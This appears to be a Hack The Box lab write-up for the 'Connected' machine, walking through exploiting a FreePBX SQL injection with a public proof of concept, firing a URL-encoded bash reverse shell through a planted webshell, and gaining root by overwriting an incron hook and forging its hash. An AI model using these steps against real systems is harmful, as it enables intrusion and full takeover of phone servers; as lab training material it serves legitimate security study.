# **HTB: Connected - Complete Penetration Testing Writeup**

**OS:** Linux (CentOS) | **Difficulty:** Medium | **Technologies:** FreePBX 16.0.40.7, Apache 2.4.6, PHP 7.4.16, OpenSSH 7.4

This write-up details the complete attack chain for the Hack The Box machine **Connected**. It covers network troubleshooting (MTU), exploiting an unauthenticated SQL injection (CVE-2025-57819) for an initial foothold, and bypassing a signature-verification mechanism in `incron` to achieve root access.

---

## **Phase 1: Reconnaissance & Network Troubleshooting**

### **1. Host Configuration & Port Scanning**
We begin by mapping the domain to the target IP and scanning for active services.

* **Command:** `echo "<TARGET_IP> connected.htb pbxconnect ucp" | sudo tee -a /etc/hosts`
  * `echo`: Prints the string.
  * `| sudo tee -a`: Pipes the output into `tee`, which appends (`-a`) the text to the protected `/etc/hosts` file with root privileges.

* **Command:** `sudo nmap -p- --min-rate 5000 -Pn <TARGET_IP>`
  * `-p-`: Scans all 65,535 TCP ports.
  * `--min-rate 5000`: Speeds up the scan by sending at least 5000 packets per second.
  * `-Pn`: Skips host discovery (ping) and assumes the target is online.

### **2. The MTU Challenge**
During web enumeration, navigating to `config.php` resulted in consistent timeouts. This indicates an MTU (Maximum Transmission Unit) mismatch causing packet fragmentation across the VPN tunnel.

* **Command:** `ip link show tun0`
  * `ip link show`: Displays network interface configuration. It revealed the MTU was set to 1500.

* **Command:** `sudo ip link set dev tun0 mtu 1200`
  * `set dev tun0 mtu 1200`: Reconfigures the VPN adapter (`tun0`) to use a smaller packet size (1200 bytes), fixing the web timeout issues.

---

## **Phase 2: Initial Access (`asterisk` user)**

The web application redirects to `/admin` and reveals **FreePBX 16.0.40.7**. This version is vulnerable to **CVE-2025-57819** (Unauthenticated SQL Injection in `/admin/ajax.php` leading to RCE).

### **3. Exploitation via watchTowr PoC**
We use a public proof-of-concept to inject a malicious cron job into the FreePBX database, which drops a PHP webshell into `/var/www/html/`.

* **Command:** `git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git`
  * Clones the exploit repository to our local machine.

* **Command:** `python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb/`
  * `-H`: The flag used by this specific script to designate the target Host URL.

### **4. Catching the Reverse Shell**
After ~2 minutes, the webshell (`this-is-an-ioc-not-actually-watchTowr-.php`) is active.

* **Command:** `nc -lvnp 4444`
  * `-l`: Listen mode.
  * `-v`: Verbose mode (shows connection status).
  * `-n`: Numeric IP mode (no DNS resolution).
  * `-p 4444`: Port to listen on.

* **Command:** `curl -s "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR_IP>/4444%200%3E%261%27"`
  * `-s`: Silent mode (hides curl's progress bar).
  * *Payload:* The URL-encoded string translates to `bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'`, which connects a bash shell back to our Netcat listener.


In [ ]:
# Reading the User Flag (as the asterisk user)
import os
os.system('cat /home/asterisk/user.txt')

---

## **Phase 3: Privilege Escalation (`root`)**

### **5. Discovering the `incron` Misconfiguration**
We search for files owned by root that our `asterisk` user can write to.

* **Command:** `find / -writable -type f -user root 2>/dev/null`
  * `-writable`: Filters for files we have permission to edit.
  * `-type f`: Looks only for files.
  * `-user root`: Ensures the file belongs to root.
  * `2>/dev/null`: Hides "Permission Denied" errors.

We discover an `incron` task that watches `/var/spool/asterisk/incron/` and triggers `/usr/bin/sysadmin_manager` as root. This manager executes hooks from the web directory, but verifies their signatures via `/var/www/html/admin/modules/ucp/module.sig` before running them. 

We have write access to both a hook (`logrotate`) AND the `module.sig` file.

### **6. Poisoning the Hook and Forging the Signature**
We overwrite the legitimate `logrotate` script with a reverse shell payload.

* **Command:** `cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'`
  * Uses a Here-Doc to overwrite the file with our bash payload.

We then calculate the new SHA-256 hash of our poisoned file so we can update the signature database.

* **Command:** `NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')`
  * `sha256sum`: Calculates the cryptographic hash.
  * `awk '{print $1}'`: Extracts only the hash string, dropping the file path.

We update the `module.sig` file to trick `sysadmin_manager` into trusting our payload.

* **Command:** `sed -i "s|hooks/logrotate = .*|hooks/logrotate = $NEW_HASH|" /var/www/html/admin/modules/ucp/module.sig`
  * `sed -i`: Stream editor in "in-place" mode to overwrite the file.
  * `s|old|new|`: Substitutes the old hash pattern with our forged `$NEW_HASH` variable.

### **7. Triggering the Execution**
We set up a new listener (`nc -lvnp 4445`) and trigger the filesystem event.

* **Command:** `touch /var/spool/asterisk/incron/ucp.logrotate`
  * `touch`: Updates the access/modification timestamp of the file. `incron` detects the change, triggers the root process, verifies our forged signature, and executes our shell.

In [ ]:
# Reading the Root Flag
os.system('cat /root/root.txt')

---

## **Summary: Complete Command Tally**

Here is the exact list of the core terminal commands utilized to conquer this machine from start to finish:

| # | Phase | Kali/Local Command | Target/Remote Command |
| --- | --- | --- | --- |
| 1 | Recon | `echo "<TARGET_IP> connected.htb pbxconnect ucp" \| sudo tee -a /etc/hosts` |  |
| 2 | Recon | `sudo nmap -p- --min-rate 5000 -Pn <TARGET_IP>` |  |
| 3 | Recon (MTU) | `ip link show tun0` |  |
| 4 | Recon (MTU) | `sudo ip link set dev tun0 mtu 1200` |  |
| 5 | Foothold | `git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git` |  |
| 6 | Foothold | `python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb/` |  |
| 7 | Foothold | `nc -lvnp 4444` |  |
| 8 | Foothold | `curl -s "http://connected.htb/...php?cmd=bash..."` |  |
| 9 | User Flag |  | `cat /home/asterisk/user.txt` |
| 10 | PrivEsc Enum |  | `find / -writable -type f -user root 2>/dev/null` |
| 11 | PrivEsc |  | `cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'...` |
| 12 | PrivEsc |  | `NEW_HASH=$(sha256sum ... \| awk '{print $1}')` |
| 13 | PrivEsc |  | `sed -i "s\|hooks/logrotate = .*\|hooks/logrotate = $NEW_HASH\|" ...module.sig` |
| 14 | PrivEsc | `nc -lvnp 4445` |  |
| 15 | PrivEsc |  | `touch /var/spool/asterisk/incron/ucp.logrotate` |
| 16 | Root Flag |  | `cat /root/root.txt` |